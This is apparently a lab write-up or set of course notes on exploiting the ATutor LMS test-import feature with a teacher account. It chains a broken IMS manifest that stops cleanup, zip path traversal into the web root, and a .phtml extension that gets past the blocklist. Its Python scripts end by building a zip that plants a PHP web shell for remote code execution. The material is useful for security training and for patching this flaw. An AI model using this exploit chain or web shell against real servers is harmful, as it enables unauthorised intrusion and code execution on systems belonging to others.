## File Upload Vulnerability
The teacher level account that we've compromised has the ability to upload files in the _Tests and Surveys_ section.

We can go to the ATutor/mods/\_standard/tests/index.php URI and try and upload a simple text file. Importing the file we get the following error:

![](../../03.%20Screenshots/t1-ss35.png)

So, we create a python script to create a zip file to upload it to the server:

```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc/poc.txt', 'offsec')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```

Executing this script, we create a zip file with our file inside the zip, and then upload it to the server.
However, this time we get a new error:

![](../../03.%20Screenshots/t1-ss36.png)

The error message indicates that the archive is missing an _IMS manifest_ file. This suggests that the contents of the ZIP archive are being inspected as well.

To understand the error, we grep for it in the atutor box, and understand where it's being used. We find the error in the following file:

```sql
-- file:

--/var/www/html/ATutor/include/install/db/atutor_language_text.sql

-- Error:

INSERT INTO `language_text` VALUES ('en', '_msgs','AT_ERROR_NO_IMSMANIFEST','IMS manifest file is missing. This does not appear to be a valid IMS content package or common cartridge.','2009-11-17 12:38:14','');
```

Morever, going through the file it seems all types of error are stored in the database.
The error is "NO_IMSMANIFEST", we can further look for this error, to see where it is occuring:

![](../../03.%20Screenshots/t1-ss37.png)

We see that the error is occuring in multiple places meaning that there are multiple paths to the same vulnerability.
However, we are interested in the import_test.php file as that's where we're uploading our file in the web application.

![](../../03.%20Screenshots/t1-ss38.png)

In the file, we see that error on line 223.
The error occurs if the "imsmanifest.xml" file doesn't exist in the zip file.

Thus, to bypass the error, we can create a valid imsmanifest xml file and try and upload our zip file again.
Our new script to include the manifest file will be as follows:
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc/poc.txt', 'offsec')
    z.writestr('imsmanifest.xml', '<validTag></validTag>')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```

Creating the file, we can now upload it:

![](../../03.%20Screenshots/t1-ss39.png)

Uploading our zip file, we can see that our zip file is uploaded.
However, now we need to find where exactly the file is being uploaded.
For this, we can simply use the find command on the atutor box:

![](../../03.%20Screenshots/t1-ss40.png)

However, there's no trace of our text file on the box. These means a successful import causes our file to get deleted.
We need to go through the code again and find a way to break the web application right after extraction.
Visiting back the php code chunk of import_test.php file where the xml file is parsed we see something interesting:

![](../../03.%20Screenshots/t1-ss41.png)

On line 246, we see that if the xml parser fails to parse the file(due it being invalid), the script will simply die.

Thus, instead of a valid xml file we will be using an invalid xml file so we get the upload. Our new script will look as follows:

```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc/poc.txt', 'offsec')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```

Creating and uploading the file:

![](../../03.%20Screenshots/t1-ss42.png)

Soon as we upload the file, we see the new error page as expected.
We now proceed to find the file in the box again:

![](../../03.%20Screenshots/t1-ss43.png)

With this, we find our poc file in the following directory:
```path
/var/content/import/16777215/poc/poc.txt
```

## Bypassing Restrictions
We have successfully found a file upload vulnerability, however, the place that the file is being uploaded, is not the web root(/var/www/html/Atutor)

We can simply bypass this restriction using a directory traversal attack.
We can perform this attack by naming our file as follows:
```
../../../../../tmp/poc/poc.txt
```

Uploading the file:

![](../../03.%20Screenshots/t1-ss44.png)

We see that the file has been uploaded to /tmp/poc directory. This means that our file traversal attack worked.

However, there's still one small caveat to solve, we need to find a writeable directory in the web root, so there's no access denied in the operating system when we try to upload the file in the context of the user running the web application.
We can simply do another find command for the following:

![](../../03.%20Screenshots/t1-ss45.png)

With the command, we find that all writable directories are a part of the following directory:
```path
/var/www/html/ATutor/mods
```

Thus, we can upload our file traversal directory to the following:
```path
../../../../../../../var/www/html/ATutor/mods/poc/poc.txt
```

Uploading the file, we see the following in the mods directory:

![](../../03.%20Screenshots/t1-ss46.png)

Our file was successfully uploaded, and can be accessed from the web application:

![](../../03.%20Screenshots/t1-ss47.png)

Now all we need to do is to find all extensions that are not allowed to be uploaded.
For this, we can go back to import_test.php file to see how exactly the file extraction process is working:

![](../../03.%20Screenshots/t1-ss48.png)

Going through the code, we see a function to filter out php files(preImportCallBack).

We can look for this function, where it is defined and see what extensions are being restricted.
We use the following grep command to find where the function is located:
```sh
grep -rnw /var/www/html/ATutor -e "function preImportCallBack" --color
# the function decleration is located in /var/www/html/ATutor/mods/_core/file_manager/filemanager.inc.php
```

We visit the file and on line 153, we find the function being declared.

![](../../03.%20Screenshots/t1-ss49.png)

Here, we see the script is using IllegalExtentions array, to filter out extensions.
We can find the declaration of this variable as well with a simple find command:

```sh
grep -irnw /var/www/html/ATutor -e "^.*illegalextentions.*" --color
#we see the variable being assigned in /var/www/html/ATutor/include/vitals.inc.php
```

Reading the contents of the file:

![](../../03.%20Screenshots/t1-ss50.png)

We see that illegal_extentions is being assigned from the variable:
```php
$_config['illegal_extentions']
```

So we proceed to look for the same, and find the following file:

![](../../03.%20Screenshots/t1-ss51.png)

We see the variable being defined in the file constants.inc.php as:
```php
31  $_config_defaults['illegal_extentions']        = 'exe|asp|php|php3|bat|cgi|pl|com|vbs|reg|pcd|pif|scr|bas|inf|vb|vbe|wsc|wsf|wsh';
```

Here, we see that a lot of extensions are being filtered out, however, we can use the phtml or php5 extension, that is recognized by apache, and gives us the opportunity, to upload a web shell.

We can upload our script again to include a php web shell:
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../../../var/www/html/ATutor/mods/poc/new.phtml', '<?php system($_REQUEST["abc"])?>')
    z.writestr('imsmanifest.xml', 'invalid xml file!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip() 
```

With this, we can upload the zip file, access the uploaded file, and visit the file to get remote code execution:
